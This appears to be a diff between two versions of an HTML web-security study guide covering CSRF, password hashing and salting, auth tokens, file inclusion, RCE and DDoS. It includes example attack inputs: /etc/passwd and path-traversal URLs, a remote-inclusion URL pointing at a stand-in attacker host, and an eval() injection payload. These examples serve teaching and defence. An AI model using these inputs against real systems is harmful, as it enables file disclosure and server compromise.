+<ul><li>Use the token on requests that <strong>change data</strong> (e.g. <strong>POST</strong>, but not GET).</li><li>When submitting, the website uses JavaScript to also submit a <strong>special token from a cookie</strong> as one of the POST request variables — a token only the legitimate site has access to.</li><li>This CSRF token typically appears somewhere in the HTML or in the cookies.</li><li>Checking for the <strong>presence</strong> of a CSRF token in the cookie is <strong>not enough</strong> — it must be <strong>included as a variable</strong> to authenticate the request.</li></ul>
+<div class="callout c-warn"><div class="callout-icon" aria-hidden="true">⚠️</div><div class="callout-body"><strong>Common trap:</strong> A common mistake is verifying that a token <em>exists</em> in the cookie but not that the submitted request variable matches it. The token must be validated as part of the request, not merely observed.</div></div>
+<div class="reflect"><span class="ri" aria-hidden="true">🤔</span><div><strong>Pause &amp; predict:</strong> Why does the GET/POST distinction matter for CSRF? Think about which request types are supposed to change server state.</div></div>
+</section>
+<section class="guide-section" id="authentication-and-password-storage" data-title="Authentication and Password Storage">
+  <div class="section-head">
+    <span class="sec-num" aria-hidden="true"></span>
+    <h2 class="section-title">Authentication and Password Storage</h2>
+  </div>
+  <p class="section-kicker">Authentication has two stages — proving who you are by logging in, then proving you are still that person on every later request.</p>
+<h3 class="sub-title">The two stages of authentication</h3>
+<ol><li><strong>Logging in</strong> — e.g. with a username and password.</li><li><strong>Identifying the logged-in session</strong> — e.g. with cookies.</li></ol>
+<h3 class="sub-title">The login flow</h3>
+<ol><li>The user sees a login form and provides a <strong>username and password</strong>.</li><li>The server <strong>hashes the password</strong> and compares the computed hash with its <strong>stored password hash</strong> for that user.</li><li>If the hashes match, the user is authenticated and the server responds with an <strong>authentication cookie/token</strong>.</li></ol>
+<h3 class="sub-title">Why we store hashes, not passwords</h3>
+<p>If passwords were stored as regular <strong>plaintext</strong>, an attacker who gained access to the database could authenticate as anyone. Instead we store <strong>password hashes</strong>, so that if the database is breached, the attacker cannot use the information as-is. To use the hashes, the attacker would need to <strong>reverse the hash</strong> to recover the original passwords — which is meant to be infeasible.</p>
+<h3 class="sub-title">Hash functions: what makes a good one</h3>
+<p>A <strong>hash function</strong> maps an input string to an output hash. Desirable properties:</p>
+<div class="table-wrap"><table><thead><tr><th>Property</th><th>Meaning</th></tr></thead><tbody><tr><td><strong>One-way</strong></td><td>Given a hash, the original string cannot be computed.</td></tr><tr><td><strong>Unpredictable</strong></td><td>You cannot choose an input string to get a particular output hash.</td></tr><tr><td><strong>Non-collision</strong></td><td>You cannot find two input strings that map to the same output hash.</td></tr></tbody></table></div>
+<div class="callout c-why"><div class="callout-icon" aria-hidden="true">💡</div><div class="callout-body"><strong>Why it matters:</strong> Hashing converts "database leak = every account compromised" into "database leak = attacker must still crack each password." The strength of that guarantee depends entirely on the three properties above.</div></div>
+</section>
+<section class="guide-section" id="cracking-passwords-and-salting" data-title="Cracking Passwords and Salting">
+  <div class="section-head">
+    <span class="sec-num" aria-hidden="true"></span>
+    <h2 class="section-title">Cracking Passwords and Salting</h2>
+  </div>
+  <p class="section-kicker">Hashes don't stop attackers — they just force them to guess; salting makes those guesses far more expensive by defeating precomputation.</p>
+<h3 class="sub-title">Cracking passwords</h3>
+<p>If an attacker wants to reverse hashes obtained from a database, they could theoretically <strong>compute the hash of every possible password</strong> and match it against their hash list. This works because passwords are hard to make up and remember, so most human-generated passwords appear in a dictionary — either as a single word or a concatenation of words.</p>
+<p>A major extension is the <strong>rainbow table</strong>: a list of commonly used passwords (e.g. <code>password1</code>, <code>ilikecats123</code>) used to supplement dictionary attacks with additional words. These attacks won't work on every user (a unique gibberish password survives), but they have been shown to work on <strong>large portions of leaked password hash sets</strong>.</p>
+<h3 class="sub-title">Salting passwords</h3>
+<p>To mitigate dictionary attacks <em>without</em> forcing stricter password rules on users, passwords can be <strong>salted</strong>. Before being fed into the hash function, the raw password is <strong>concatenated with another string</strong>, the salt.</p>
+<ul><li>Salts are usually stored <strong>in plaintext</strong> in the database, right next to the password hashes.</li><li>For further security, a <strong>different salt per user</strong> can be used.</li><li>Salting <strong>thwarts dictionary attacks that rely on massive precomputation</strong> (rainbow tables), because the attacker must redo the work for every salt.</li><li><strong>However:</strong> once the salt is known, brute-force dictionary attacks may still be run.</li></ul>
+<div class="callout c-memory"><div class="callout-icon" aria-hidden="true">🧠</div><div class="callout-body"><strong>Memory hook:</strong> <em>Salt makes precomputation useless, not cracking impossible.</em> A leaked salt plus a weak password is still crackable — salting raises the cost, it does not remove the risk.</div></div>
+<div class="reflect"><span class="ri" aria-hidden="true">🤔</span><div><strong>Pause &amp; predict:</strong> Two users both choose the password <code>ilikecats123</code>. Without salting their stored hashes are identical. What does that reveal to an attacker, and how does per-user salting change it?</div></div>
+</section>
+<section class="guide-section" id="authentication-tokens-and-cookie-hygiene" data-title="Authentication Tokens and Cookie Hygiene">
+  <div class="section-head">
+    <span class="sec-num" aria-hidden="true"></span>
+    <h2 class="section-title">Authentication Tokens and Cookie Hygiene</h2>
+  </div>
+  <p class="section-kicker">After login you carry a token in your cookie; the server can remember tokens statefully or recompute them statelessly, and either way the cookie itself must be locked down.</p>
+<h3 class="sub-title">Two ways to manage the auth token</h3>
+<p>After a user provides their password and is authenticated, they receive an <strong>auth token</strong>, delivered in the <strong>cookies</strong>. There are two main strategies:</p>
+<div class="table-wrap"><table><thead><tr><th>Strategy</th><th>How it works</th><th>Example</th></tr></thead><tbody><tr><td><strong>Stateful</strong></td><td>Store valid tokens &amp; expiry in a database</td><td>Redis</td></tr><tr><td><strong>Stateless</strong></td><td>Calculate valid tokens from a hash of details plus a secret</td><td>Calculated tokens</td></tr></tbody></table></div>
+<p>Storing valid tokens in a database is obvious; calculated tokens are less so.</p>
+<h3 class="sub-title">Calculated (stateless) authentication tokens</h3>
+<p>Calculated tokens let the server check whether a user is authenticated <strong>without storing tokens</strong>. It computes a value that can be <strong>re-computed after every request</strong>, then checks whether the provided token matches the calculated one. This adds <strong>computational overhead</strong> (the token is recomputed on every request) but <strong>reduces memory overhead</strong>.</p>
+<div class="code-block"><button class="code-copy" type="button">Copy</button><pre><code>def build_auth_token(self):
     max_validity_duration_seconds = 21600  # 6 hours
-    timestamp = int(datetime.datetime.utcnow().strftime(&quot;%s&quot;))
-    # Quantise the timestamp into the current 6-hour window
-    validity_timestamp = int(timestamp - (timestamp % max_validity_duration_seconds))
+    timestamp = int(
+        datetime.datetime.utcnow().strftime(&quot;%s&quot;)
+    )
+    validity_timestamp = int(
+        timestamp - (timestamp % max_validity_duration_seconds)
+    )
     auth_token = hashlib.sha512(
         self.secret_key[0] +
         str(validity_timestamp) +
@@ -422,225 +705,418 @@ $result = mysql_query($query);</code></pre></div>
     return auth_token.hexdigest()
 
 def validate_auth_token(self, token):
-    return self.build_auth_token() == token</code></pre></div>
-<p>The server combines a <strong>secret key</strong>, a <strong>time window</strong>, and the <strong>user ID</strong>, and recomputes the same hash to validate.</p>
-<p><strong>Storing and sending cookies — a hardening checklist:</strong></p>
-<div class="table-wrap"><table><thead><tr><th>Security measure</th><th>Protection</th></tr></thead><tbody><tr><td><strong>Always use HTTPS</strong></td><td>Prevents network <strong>MITM</strong> attacks from sniffing auth cookies</td></tr><tr><td><strong>Secure attribute</strong></td><td>Cookie is only sent when connecting via HTTPS</td></tr><tr><td><strong>HttpOnly attribute</strong></td><td>Scripts on the page cannot read the cookie (e.g. via XSS); cookies are only sent with HTTP(S) requests</td></tr></tbody></table></div>
-<div class="callout why"><div class="callout-ico" aria-hidden="true">💡</div><div class="callout-body"><p class="callout-title">Why It Matters:</p><div class="callout-text">An auth cookie is a temporary password. HTTPS stops it being sniffed, <code>Secure</code> stops it leaking over plaintext, and <code>HttpOnly</code> removes the easiest XSS cookie-theft path.</div></div></div></div></section>
-<section class="section" id="sec-11"><header class="section-head"><span class="section-num">11</span><h2>Local &amp; Remote File Inclusion</h2></header><div class="section-body"><p><strong>Local/Remote File Inclusion</strong> (<code>file:///</code>) is a vulnerability where the web application is manipulated into loading an <strong>unexpected file</strong>. This can be used to read a file's contents or to change the program's behaviour dynamically.</p>
-<p><strong>Vulnerable code:</strong></p>
-<div class="code"><button class="copy" type="button" data-copy>Copy</button><pre><code>$page = $_GET[&quot;page&quot;];
+    return self.build_auth_token() == token;</code></pre></div>
+<p>Notice how the token combines a <strong>secret key</strong>, a <strong>time bucket</strong> (the timestamp rounded down to a 6-hour window), and the <strong>user id</strong>. Because the timestamp is rounded, the same token stays valid within the window; when the window rolls over, the recomputed token changes.</p>
+<h3 class="sub-title">Cookie storage and transport tips</h3>
+<ul><li><strong>Always access the website over HTTPS</strong> — this prevents network <strong>MITM (man-in-the-middle) attacks</strong> from sniffing auth cookies.</li><li>Set the cookie's <strong><code>secure</code> attribute</strong> — the cookie is only sent when connecting via HTTPS.</li><li>Set the cookie's <strong><code>HttpOnly</code> attribute</strong> — scripts on the page <strong>cannot read</strong> the cookie (e.g. via XSS), and cookies are only sent with HTTP(S) requests.</li></ul>
+<div class="callout c-why"><div class="callout-icon" aria-hidden="true">💡</div><div class="callout-body"><strong>Why it matters:</strong> <code>HttpOnly</code> directly neutralises the XSS cookie-theft attack from earlier: even if an attacker injects JavaScript, <code>document.cookie</code> cannot see the auth cookie.</div></div>
+<div class="reflect"><span class="ri" aria-hidden="true">🤔</span><div><strong>Pause &amp; predict:</strong> An attacker steals a calculated auth token. It was valid for the current 6-hour window. What happens when the window rolls over, and why can't the attacker simply keep using the old token forever?</div></div>
+</section>
+<section class="guide-section" id="lfi-rfi-rce-and-ddos" data-title="LFI/RFI, RCE and DDoS">
+  <div class="section-head">
+    <span class="sec-num" aria-hidden="true"></span>
+    <h2 class="section-title">LFI/RFI, RCE and DDoS</h2>
+  </div>
+  <p class="section-kicker">Three further server-side attacks escalate from reading a file, to running arbitrary code, to simply drowning the service in traffic.</p>
+<h3 class="sub-title">Local/Remote File Inclusion (LFI/RFI)</h3>
+<p>File inclusion (<code>file:///</code>) is a vulnerability where the web application is <strong>manipulated into loading an unexpected file</strong>. It can be used to obtain a file's contents or to dynamically change the program's behaviour. The classic vulnerable pattern:</p>
+<div class="code-block"><button class="code-copy" type="button">Copy</button><pre><code>$page = $_GET[&quot;page&quot;];
 include($page);</code></pre></div>
-<p><strong>Exploitation types:</strong></p>
-<ul><li><strong>Local File Inclusion (LFI)</strong> — files already on the server. Visiting:</li></ul>
-<div class="code"><button class="copy" type="button" data-copy>Copy</button><pre><code>  http://example.com/index.php?page=/etc/passwd</code></pre></div>
-<p>outputs the <code>/etc/passwd</code> file if not configured correctly, leaking sensitive system account data. Using path traversal:</p>
-<div class="code"><button class="copy" type="button" data-copy>Copy</button><pre><code>  http://example.com/index.php?page=../../../../etc/passwd</code></pre></div>
-<ul><li><strong>Remote File Inclusion (RFI)</strong> — trick the server into loading a file from a remote location, e.g. <code>...?page=http://hacker.com/malicious_shell.txt</code>, causing the server to fetch and execute remote code.</li></ul>
-<p>While this looks obvious, it is a <strong>very common bug</strong>.</p>
-<p><strong>Defence:</strong> Never let user parameters govern which files can be included. Use a <strong>strict hardcoded lookup map or whitelist</strong> of allowed page templates.</p></div></section>
-<section class="section" id="sec-12"><header class="section-head"><span class="section-num">12</span><h2>Remote Code Execution (RCE)</h2></header><div class="section-body"><p><strong>Remote / Arbitrary Code Execution</strong> is a vulnerability where an attacker can provide code that runs on the remote server. It is considered <strong>the worst type of exploit</strong> because it quickly leads to <strong>full server compromise</strong>.</p>
-<p><strong>Common culprits:</strong></p>
-<ul><li>The <strong><code>eval()</code> function</strong> (or equivalent dynamic evaluation such as <code>exec()</code>, <code>passthru()</code>, <code>system()</code>).</li><li><strong>PHP <code>unserialize()</code></strong> (insecure object unserialisation; Python's <code>pickle.loads()</code> is analogous).</li><li><strong>Regular expressions with the <code>e</code> flag</strong> (deprecated PHP <code>/e</code> modifier that evaluates the replacement as code).</li></ul>
-<p><strong>Example vulnerability</strong> (from the OWASP Code Injection page):</p>
-<div class="code"><button class="copy" type="button" data-copy>Copy</button><pre><code>$myvar = &quot;varname&quot;;
+<p>Simply visiting:</p>
+<div class="code-block"><button class="code-copy" type="button">Copy</button><pre><code>http://example.com/index.php?page=/etc/passwd</code></pre></div>
+<p>will output the <code>/etc/passwd</code> file if the app is not configured correctly. Simple and obvious as it looks, this is a <strong>very common bug</strong>.</p>
+<ul><li><strong>Local</strong> file inclusion = files already on the server (as above).</li><li><strong>Remote</strong> file inclusion = get the server to load a file from a <strong>remote location</strong>.</li><li><strong>Defence:</strong> don't allow user parameters to govern what files can be included.</li></ul>
+<h3 class="sub-title">Remote Code Execution (RCE)</h3>
+<p>Remote/Arbitrary Code Execution is a vulnerability where an attacker can <strong>provide code that runs on the remote server</strong>. It is considered the <strong>worst type of exploit</strong>, because it quickly leads to <strong>full server compromise</strong>. The most common culprits:</p>
+<ul><li>The <strong><code>eval()</code></strong> function (or equivalent).</li><li>PHP <strong><code>unserialize()</code></strong>.</li><li><strong>Regular Expressions with the <code>e</code> flag</strong>.</li></ul>
+<p>Example from the OWASP Code Injection page:</p>
+<div class="code-block"><button class="code-copy" type="button">Copy</button><pre><code>$myvar = &quot;varname&quot;;
 $x = $_GET[&#x27;arg&#x27;];
 eval(&quot;\$myvar = \$x;&quot;);</code></pre></div>
-<p>If <code>$x</code> contains <code>1; system('id');</code>, the server executes <code>system('id')</code> with web-server privileges.</p>
-<p><strong>Defence:</strong> Avoid <code>eval()</code> and related unsafe dynamic execution constructs entirely. If system calls are mandatory, sanitise and validate inputs against rigorous whitelists.</p>
-<div class="callout tip"><div class="callout-ico" aria-hidden="true">✅</div><div class="callout-body"><p class="callout-title">Exam Tip:</p><div class="callout-text">RCE is the "game over" vulnerability — link it to least privilege and file inclusion, because a compromised low-privilege user limits the blast radius.</div></div></div></div></section>
-<section class="section" id="sec-13"><header class="section-head"><span class="section-num">13</span><h2>Denial of Service (DDoS)</h2></header><div class="section-body"><p><strong>Denial of Service</strong> attacks prevent anyone from accessing a particular website. Typically this is done by <strong>flooding the site with a very large amount of traffic</strong> from distributed botnets so legitimate user requests cannot be processed, exhausting bandwidth, CPU, or database connections.</p>
-<p><strong>Defence is very difficult:</strong></p>
-<ul><li>Detection mechanisms to separate attack traffic from legitimate "flash crowds" introduce a <strong>large amount of overhead</strong> for legitimate requests.</li><li>The only real way to defend your system is to <strong>"absorb"</strong> the attack traffic, using distributed CDNs, Anycast routing, rate limiting, and web application firewalls (WAFs).</li></ul>
-<div class="callout why"><div class="callout-ico" aria-hidden="true">💡</div><div class="callout-body"><p class="callout-title">Why It Matters:</p><div class="callout-text">You cannot easily filter a DDoS without also hurting real users, so resilience — spreading load and having surplus capacity — matters as much as detection.</div></div></div></div></section>
-<section class="section" id="sec-14"><header class="section-head"><span class="section-num">14</span><h2>Real-World Case Studies</h2></header><div class="section-body"><p>Real breaches often stem from surprisingly <strong>basic</strong> flaws.</p>
-<p><strong>Empty password flaws</strong> — services that logged users in when an empty password was submitted:</p>
-<ul><li><strong>Apple / macOS High Sierra (2017)</strong> — a bug let you log in as admin with no password required.</li><li><strong>Valve / Steam (2015)</strong> — the password-reset flow allowed changing passwords with blank tokens.</li><li><strong>Linux-PAM &lt; 1.5.1</strong> — CVE-2020-27780 authentication bypass with empty passwords.</li></ul>
-<p><strong>Default accounts with empty passwords</strong> — anyone could log in:</p>
-<ul><li><strong>Western Digital My Cloud (2019)</strong> — CVE-2019-9950, unauthenticated admin access via default credentials.</li><li><strong>Microsoft SQL Server (2000)</strong> — CVE-2000-1209, default <code>sa</code> account with a blank password.</li><li><strong>D-Link (2020)</strong> — CVE-2020-8864, default backdoor accounts with empty passwords.</li></ul>
-<p><strong>No password check at all</strong> — logins accepted without checking the password:</p>
+<p>Here the attacker's <code>arg</code> is executed as PHP by <code>eval()</code>.</p>
+<h3 class="sub-title">Distributed Denial of Service (DDoS)</h3>
+<p>Denial of Service attacks <strong>prevent anyone from accessing a particular website</strong>. Typically this is done by <strong>flooding the website with a very large amount of traffic</strong> so legitimate user requests cannot be processed.</p>
+<ul><li><strong>Defence is very difficult</strong> — detection mechanisms can introduce a large amount of overhead for legitimate requests.</li><li>The only real way to defend your system is to <strong>"absorb" the attack traffic</strong>.</li></ul>
+<div class="callout c-warn"><div class="callout-icon" aria-hidden="true">⚠️</div><div class="callout-body"><strong>Common trap:</strong> Don't confuse LFI (read a file) with RCE (run code). LFI is a stepping stone; RCE is the full compromise. <code>eval()</code> is the shortest path from input to RCE.</div></div>
+</section>
+<section class="guide-section" id="case-studies-authentication-failures-in-the-wild" data-title="Case Studies: Authentication Failures in the Wild">
+  <div class="section-head">
+    <span class="sec-num" aria-hidden="true"></span>
+    <h2 class="section-title">Case Studies: Authentication Failures in the Wild</h2>
+  </div>
+  <p class="section-kicker">Real products shipped with astonishingly basic authentication flaws — these cases show why the fundamentals matter more than clever defences.</p>
+<h3 class="sub-title">Empty password accepted</h3>
+<p>How many websites/services/operating systems have allowed login when an <strong>empty password</strong> is submitted for a user?</p>
+<ul><li><strong>Apple/macOS High Sierra (2017)</strong> — a bug let you log in as admin with no password required.</li><li><strong>Valve/Steam (2015)</strong>.</li><li><strong>Linux-PAM &lt; 1.5.1</strong> — CVE-2020-27780.</li></ul>
+<h3 class="sub-title">Default account with empty password</h3>
+<p>How many have shipped <strong>default accounts with empty passwords</strong>, allowing anyone to log in?</p>
+<ul><li><strong>Western Digital My Cloud (2019)</strong> — CVE-2019-9950.</li><li><strong>Microsoft SQL Server (2000)</strong> — CVE-2000-1209.</li><li><strong>D-Link (2020)</strong> — CVE-2020-8864.</li></ul>
+<h3 class="sub-title">No password check at all</h3>
+<p>How many have allowed login <strong>without checking the password at all</strong>?</p>
 <ul><li><strong>IRC5 (2020)</strong> — CVE-2020-10288.</li><li><strong>Eclipse Mosquitto (2018)</strong> — CVE-2018-12551.</li><li><strong>Keycloak (2019)</strong> — CVE-2019-14909.</li></ul>
-<p><strong>High-profile web incidents:</strong></p>
-<ul><li><strong>Dropbox</strong> — a security bug made passwords optional for four hours.</li><li><strong>vBulletin CVE-2015-7808</strong> — an RCE flaw exploited in public forums worldwide (in Metasploit).</li><li><strong>The MySpace Samy Worm</strong> — the fastest-spreading XSS worm, using unescaped HTML/JS in profiles.</li><li><strong>GitHub DDoS</strong> — one of the largest recorded DDoS attacks.</li><li><strong>The Annoying Site</strong> — a demonstrated browser annoyance/exploit example.</li></ul>
-<div class="callout memory"><div class="callout-ico" aria-hidden="true">🧠</div><div class="callout-body"><p class="callout-title">Memory Hook:</p><div class="callout-text">Most famous breaches were not exotic — they were <strong>empty/blank/default password</strong> mistakes. Always enforce the basics.</div></div></div></div></section>
-<section class="section" id="key-takeaways"><header class="section-head"><span class="section-num">15</span><h2>Key Takeaways</h2></header><div class="section-body"><ol class="takeaways"><li><span class="tk-n">1</span><div><strong>Attackers exploit designer mistakes</strong> — wrong priorities, wrong implementation, poor assumptions, weak threat models, and misunderstood scope.</div></li><li><span class="tk-n">2</span><div><strong>Servers vs users</strong> — SQLi, RCE, and file inclusion hit servers; XSS and CSRF hit users; both can lead to compromise.</div></li><li><span class="tk-n">3</span><div><strong>Prioritise risk</strong> — balance likelihood of exploitation, damage if exploited, and mitigation cost across a 7-level severity hierarchy.</div></li><li><span class="tk-n">4</span><div><strong>Use standard resources and stay legal</strong> — OWASP, CVE, DVWA, PentesterLab; only test systems you are explicitly permitted to test, and pre-approve cloud scans.</div></li><li><span class="tk-n">5</span><div><strong>SQLi = data becomes code</strong> — defend with parameterised/prepared statements or an ORM, never string concatenation.</div></li><li><span class="tk-n">6</span><div><strong>XSS = injected HTML/JS</strong> — stripping <code>&lt;script&gt;</code> fails; escape output with your templating library.</div></li><li><span class="tk-n">7</span><div><strong>CSRF = the browser is authenticated, not the user's intent</strong> — use per-request CSRF tokens passed as a variable, not just a cookie.</div></li><li><span class="tk-n">8</span><div><strong>Hash passwords, never store plaintext</strong> — hashes must be one-way, unpredictable, and collision-resistant.</div></li><li><span class="tk-n">9</span><div><strong>Salt every password uniquely</strong> — salting defeats precomputed rainbow tables and forces per-user recomputation.</div></li><li><span class="tk-n">10</span><div><strong>Manage auth tokens statefully (DB) or statelessly (calculated)</strong> — calculated tokens trade CPU for less memory.</div></li><li><span class="tk-n">11</span><div><strong>Harden cookies</strong> — always HTTPS, plus the <code>Secure</code> and <code>HttpOnly</code> attributes.</div></li><li><span class="tk-n">12</span><div><strong>LFI/RFI loads unexpected files; RCE runs attacker code</strong> — whitelist included files and never use <code>eval()</code>.</div></li><li><span class="tk-n">13</span><div><strong>DDoS defence means absorbing traffic</strong> — detection adds overhead, so CDNs, rate limiting, and WAFs matter.</div></li><li><span class="tk-n">14</span><div><strong>Basics matter most</strong> — empty, default, and unchecked passwords caused many real breaches.</div></li></ol></div></section>
-<section class="section" id="glossary"><header class="section-head"><span class="section-num">16</span><h2>Glossary</h2></header><div class="section-body"><div class="term-filter"><input type="search" id="termSearch" placeholder="Filter terms…" autocomplete="off" aria-label="Filter glossary terms"><span class="term-count" id="termCount"></span></div><div class="terms" id="termsGrid"><div class="term" data-term="owasp open web application security project — non-profit publishing the owasp top 10 web vulnerability list"><p class="term-name">OWASP</p><p class="term-def">Open Web Application Security Project — non-profit publishing the OWASP Top 10 web vulnerability list</p></div><div class="term" data-term="cve common vulnerabilities and exposures — public database of known vulnerabilities and breaches (&gt;160,000 tracked)"><p class="term-name">CVE</p><p class="term-def">Common Vulnerabilities and Exposures — public database of known vulnerabilities and breaches (&gt;160,000 tracked)</p></div><div class="term" data-term="dvwa damn vulnerable web application — intentionally vulnerable app for practising web attacks"><p class="term-name">DVWA</p><p class="term-def">Damn Vulnerable Web Application — intentionally vulnerable app for practising web attacks</p></div><div class="term" data-term="pentesterlab hands-on penetration-testing tutorials and web exploitation labs"><p class="term-name">PentesterLab</p><p class="term-def">Hands-on penetration-testing tutorials and web exploitation labs</p></div><div class="term" data-term="threat model the understanding of who attacks a system, why, and through which entry points"><p class="term-name">Threat model</p><p class="term-def">The understanding of who attacks a system, why, and through which entry points</p></div><div class="term" data-term="attack surface the full set of components, code, people, and interfaces an attacker can target"><p class="term-name">Attack surface</p><p class="term-def">The full set of components, code, people, and interfaces an attacker can target</p></div><div class="term" data-term="axiom a foundational security truth, e.g. all systems are buggy"><p class="term-name">Axiom</p><p class="term-def">A foundational security truth, e.g. all systems are buggy</p></div><div class="term" data-term="sqli sql injection — altering an sql query by injecting unsanitised input"><p class="term-name">SQLi</p><p class="term-def">SQL Injection — altering an SQL query by injecting unsanitised input</p></div><div class="term" data-term="parameterised query prepared statement that keeps user data separate from sql command logic"><p class="term-name">Parameterised query</p><p class="term-def">Prepared statement that keeps user data separate from SQL command logic</p></div><div class="term" data-term="orm object-relational mapper — library that builds parameterised queries automatically"><p class="term-name">ORM</p><p class="term-def">Object-Relational Mapper — library that builds parameterised queries automatically</p></div><div class="term" data-term="sqlmap open-source python tool that automates detecting and exploiting sql injection"><p class="term-name">sqlmap</p><p class="term-def">Open-source Python tool that automates detecting and exploiting SQL injection</p></div><div class="term" data-term="xss cross-site scripting — injecting html/javascript that runs in a victim&#x27;s browser"><p class="term-name">XSS</p><p class="term-def">Cross-Site Scripting — injecting HTML/JavaScript that runs in a victim's browser</p></div><div class="term" data-term="html escaping converting characters like `&lt;` and `&gt;` into entities such as `&amp;lt;` and `&amp;gt;` so they display, not execute"><p class="term-name">HTML escaping</p><p class="term-def">Converting characters like <code>&lt;</code> and <code>&gt;</code> into entities such as <code>&amp;lt;</code> and <code>&amp;gt;</code> so they display, not execute</p></div><div class="term" data-term="csrf cross-site request forgery — forcing a logged-in browser to send an unintended request"><p class="term-name">CSRF</p><p class="term-def">Cross-Site Request Forgery — forcing a logged-in browser to send an unintended request</p></div><div class="term" data-term="csrf token a secret per-request value that proves a state-changing request came from the real site"><p class="term-name">CSRF token</p><p class="term-def">A secret per-request value that proves a state-changing request came from the real site</p></div><div class="term" data-term="same-origin policy browser rule preventing one site from reading another site&#x27;s data/tokens"><p class="term-name">Same-Origin Policy</p><p class="term-def">Browser rule preventing one site from reading another site's data/tokens</p></div><div class="term" data-term="authentication proving identity, typically with a username and password"><p class="term-name">Authentication</p><p class="term-def">Proving identity, typically with a username and password</p></div><div class="term" data-term="session state maintained across requests after login, usually via a cookie or token"><p class="term-name">Session</p><p class="term-def">State maintained across requests after login, usually via a cookie or token</p></div><div class="term" data-term="hash function a one-way function mapping an input string to a fixed output hash"><p class="term-name">Hash function</p><p class="term-def">A one-way function mapping an input string to a fixed output hash</p></div><div class="term" data-term="one-way (pre-image resistance) property that a hash cannot be reversed to recover the input"><p class="term-name">One-way (pre-image resistance)</p><p class="term-def">Property that a hash cannot be reversed to recover the input</p></div><div class="term" data-term="unpredictable (avalanche effect) property that you cannot target a specific output hash, and small input changes change the output fully"><p class="term-name">Unpredictable (avalanche effect)</p><p class="term-def">Property that you cannot target a specific output hash, and small input changes change the output fully</p></div><div class="term" data-term="non-collision (collision resistance) property that two different inputs cannot produce the same hash"><p class="term-name">Non-collision (collision resistance)</p><p class="term-def">Property that two different inputs cannot produce the same hash</p></div><div class="term" data-term="dictionary attack hashing common words/passwords and matching them against stolen hashes"><p class="term-name">Dictionary attack</p><p class="term-def">Hashing common words/passwords and matching them against stolen hashes</p></div><div class="term" data-term="rainbow table precomputed lookup table of popular passwords and variations mapped to hashes"><p class="term-name">Rainbow table</p><p class="term-def">Precomputed lookup table of popular passwords and variations mapped to hashes</p></div><div class="term" data-term="salt a random string concatenated with a password before hashing, stored in plaintext per user"><p class="term-name">Salt</p><p class="term-def">A random string concatenated with a password before hashing, stored in plaintext per user</p></div><div class="term" data-term="auth token credential issued after login and carried in cookies to identify the session"><p class="term-name">Auth token</p><p class="term-def">Credential issued after login and carried in cookies to identify the session</p></div><div class="term" data-term="stateful token valid token and expiry stored in a database (e.g. redis)"><p class="term-name">Stateful token</p><p class="term-def">Valid token and expiry stored in a database (e.g. Redis)</p></div><div class="term" data-term="stateless (calculated) token token recomputed from a secret, a time window, and user id without storage"><p class="term-name">Stateless (calculated) token</p><p class="term-def">Token recomputed from a secret, a time window, and user ID without storage</p></div><div class="term" data-term="mitm man-in-the-middle — an attacker intercepting network traffic"><p class="term-name">MITM</p><p class="term-def">Man-In-The-Middle — an attacker intercepting network traffic</p></div><div class="term" data-term="secure attribute cookie flag ensuring the cookie is only sent over https"><p class="term-name">Secure attribute</p><p class="term-def">Cookie flag ensuring the cookie is only sent over HTTPS</p></div><div class="term" data-term="httponly attribute cookie flag blocking javascript from reading the cookie"><p class="term-name">HttpOnly attribute</p><p class="term-def">Cookie flag blocking JavaScript from reading the cookie</p></div><div class="term" data-term="lfi local file inclusion — loading an unexpected local file (e.g. `/etc/passwd`)"><p class="term-name">LFI</p><p class="term-def">Local File Inclusion — loading an unexpected local file (e.g. <code>/etc/passwd</code>)</p></div><div class="term" data-term="rfi remote file inclusion — loading and executing a file from a remote attacker-controlled server"><p class="term-name">RFI</p><p class="term-def">Remote File Inclusion — loading and executing a file from a remote attacker-controlled server</p></div><div class="term" data-term="path traversal using `../` sequences to reach files outside the intended directory"><p class="term-name">Path traversal</p><p class="term-def">Using <code>../</code> sequences to reach files outside the intended directory</p></div><div class="term" data-term="rce remote code execution — running attacker-supplied code on the server; worst-case exploit"><p class="term-name">RCE</p><p class="term-def">Remote Code Execution — running attacker-supplied code on the server; worst-case exploit</p></div><div class="term" data-term="eval() dangerous function that executes a string as code"><p class="term-name">eval()</p><p class="term-def">Dangerous function that executes a string as code</p></div><div class="term" data-term="unserialisation reconstructing objects from data; insecure versions (php `unserialize()`, python `pickle`) enable rce"><p class="term-name">Unserialisation</p><p class="term-def">Reconstructing objects from data; insecure versions (PHP <code>unserialize()</code>, Python <code>pickle</code>) enable RCE</p></div><div class="term" data-term="ddos distributed denial of service — flooding a site from many sources so legitimate users are locked out"><p class="term-name">DDoS</p><p class="term-def">Distributed Denial of Service — flooding a site from many sources so legitimate users are locked out</p></div><div class="term" data-term="waf web application firewall — filters malicious traffic before it reaches the application"><p class="term-name">WAF</p><p class="term-def">Web Application Firewall — filters malicious traffic before it reaches the application</p></div><div class="term" data-term="flash crowd a surge of legitimate traffic that can be mistaken for an attack"><p class="term-name">Flash crowd</p><p class="term-def">A surge of legitimate traffic that can be mistaken for an attack</p></div><div class="term" data-term="plaintext password a password stored unencrypted — a critical design failure"><p class="term-name">Plaintext password</p><p class="term-def">A password stored unencrypted — a critical design failure</p></div></div></div></section>
-<section class="section" id="mnemonics"><header class="section-head"><span class="section-num">17</span><h2>Mnemonics &amp; Quick Recall</h2></header><div class="section-body"><div class="mnemonics"><div class="mnemonic"><p class="mn-title">Why Systems Get Hacked</p><p class="mn-code">Wrong, Wrong Way, Assumptions, Threat Model, Paradigms, Scope</p></div><div class="mnemonic"><p class="mn-title">Six Security Axioms</p><p class="mn-code">R-B-S-I-H-A</p><p class="mn-note">Resource game, Buggy systems, Size, Isolation, Humans, Asymmetry</p></div><div class="mnemonic"><p class="mn-title">Vulnerability → Defence</p><p class="mn-code">SQLi→Parameterise, XSS→Escape, CSRF→Token, LFI/RFI→Whitelist, RCE→Avoid eval</p></div><div class="mnemonic"><p class="mn-title">Hash Properties</p><p class="mn-code">O-U-N</p><p class="mn-note">One-way, Unpredictable, Non-collision</p></div><div class="mnemonic"><p class="mn-title">Cookie Hardening</p><p class="mn-code">H-S-H</p><p class="mn-note">HTTPS, Secure flag, HttpOnly flag</p></div><div class="mnemonic"><p class="mn-title">Authentication Stages</p><p class="mn-code">Login, then Session</p><p class="mn-note">prove identity, then remember it</p></div><div class="mnemonic"><p class="mn-title">Salting</p><p class="mn-code">Hash(Password + Salt)</p><p class="mn-note">unique random salt per user defeats rainbow tables</p></div><div class="mnemonic"><p class="mn-title">RCE Culprits</p><p class="mn-code">eval, unserialize, regex 